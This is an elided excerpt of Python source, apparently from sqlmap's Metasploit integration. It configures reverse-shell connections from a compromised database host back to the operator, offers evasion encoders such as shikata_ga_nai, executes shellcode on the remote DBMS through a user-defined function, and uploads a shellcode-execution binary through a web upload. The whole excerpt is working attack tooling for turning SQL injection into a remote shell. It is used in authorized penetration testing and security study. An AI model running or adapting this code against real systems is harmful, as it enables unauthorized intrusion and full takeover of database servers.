...
class Metasploit(object):
    ...
    def _initVars(self):
        ...
        self._msfCli = normalizePath(
            os.path.join(conf.msfPath, "msfcli%s" % (".bat" if IS_WIN else ""))
        )
        self._msfConsole = normalizePath(
            os.path.join(conf.msfPath, "msfconsole%s" % (".bat" if IS_WIN else ""))
        )
        self._msfEncode = normalizePath(
            os.path.join(conf.msfPath, "msfencode%s" % (".bat" if IS_WIN else ""))
        )
        self._msfPayload = normalizePath(
            os.path.join(conf.msfPath, "msfpayload%s" % (".bat" if IS_WIN else ""))
        )
        self._msfVenom = normalizePath(
            os.path.join(conf.msfPath, "msfvenom%s" % (".bat" if IS_WIN else ""))
        )
        ...
        self._msfConnectionsList = {
            "windows": {
                1: (
                    (
                        "Reverse TCP: Connect back from the database host to this"
                        " machine (default)"
                    ),
                    "reverse_tcp",
                ),
                2: (
                    (
                        "Reverse TCP: Try to connect back from the database host to"
                        " this machine, on all ports between the specified and 65535"
                    ),
                    "reverse_tcp_allports",
                ),
                3: (
                    (
                        "Reverse HTTP: Connect back from the database host to this"
                        " machine tunnelling traffic over HTTP"
                    ),
                    "reverse_http",
                ),
                4: (
                    (
                        "Reverse HTTPS: Connect back from the database host to this"
                        " machine tunnelling traffic over HTTPS"
                    ),
                    "reverse_https",
                ),
                5: (
        ...
        self._msfEncodersList = {
            "windows": {
                ...
                8: (
                    "Polymorphic Jump/Call XOR Additive Feedback Encoder",
                    "x86/jmp_call_additive",
                ),
                9: ("Non-Alpha Encoder", "x86/nonalpha"),
                10: ("Non-Upper Encoder", "x86/nonupper"),
                11: (
                    "Polymorphic XOR Additive Feedback Encoder (default)",
                    "x86/shikata_ga_nai",
                ),
                12: (
    ...
    def _skeletonSelection(self, msg, lst=None, maxValue=1, default=1):
        ...
        if (
            not choice
            or not isDigit(choice)
            or int(choice) > maxValue
            or int(choice) < 1
        ):
            choice = default
    ...
    def _selectPayload(self):
        ...
        if (
            self.connectionStr.startswith("reverse_http")
            and _payloadStr != "windows/meterpreter"
        ):
        ...
        for connType, connStr in self._portData.items():
            if self.connectionStr.startswith(connType):
                return self._skeletonSelection(
                    connStr, maxValue=65535, default=randomRange(1025, 65535)
                )

    def _selectRhost(self):
        if self.connectionStr.startswith("bind"):
            message = (
                "what is the back-end DBMS address? [Enter for '%s' (detected)] "
                % self.remoteIP
            )
    ...
    def _selectLhost(self):
        if self.connectionStr.startswith("reverse"):
            message = (
                "what is the local address? [Enter for '%s' (detected)] " % self.localIP
            )
    ...
    def _runMsfShellcodeRemote(self):
        ...
        self.udfExecCmd(
            "'%s'" % self.shellcodeString, silent=True, udfName="sys_bineval"
        )
    ...
    def _controlMsfCmd(self, proc, func):
        ...
        while True:
            ...
            try:
                ...
                pwnBofCond &= any(
                    _ in out
                    for _ in (b"Starting the payload handler", b"Started reverse")
                )
    ...
    def createMsfShellcode(self, exitfunc, format, extra, encode):
        ...
        self._shellcodeFilePath = os.path.join(
            conf.outputPath, "tmpm%s" % self._randStr
        )
    ...
    def uploadShellcodeexec(self, web=False):
        ...
        if Backend.isOs(OS.WINDOWS):
            self.shellcodeexecLocal = os.path.join(
                self.shellcodeexecLocal, "windows", "shellcodeexec.x%s.exe_" % "32"
            )
        ...
        if web:
            written = self.webUpload(
                ...
                os.path.split(self.shellcodeexecRemote)[0],
